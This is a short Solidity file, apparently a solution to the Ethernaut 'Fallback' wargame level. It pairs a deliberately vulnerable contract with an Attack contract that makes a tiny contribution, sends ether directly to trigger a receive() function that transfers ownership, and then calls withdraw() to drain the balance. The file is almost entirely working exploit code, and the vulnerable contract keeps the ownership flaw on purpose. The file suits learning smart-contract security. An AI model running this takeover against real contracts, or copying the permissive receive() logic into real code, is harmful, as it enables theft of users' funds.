pragma solidity ^0.8.0;

interface IFallback {
    function owner() external view returns (address);

    function contributions(address) external view returns (uint256);

    function contribute() external payable;

    function withdraw() external;
}

contract Attack {
    IFallback add;

    constructor(IFallback _add) {
        add = _add;
    }

    function attack() public payable {
        add.contribute{value: 1}();
        (bool isreceived, ) = address(add).call{value: 1}("");
        require(isreceived, "was not payable");
        add.withdraw();
    }

    receive() external payable {}
}

contract Fallback {
    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
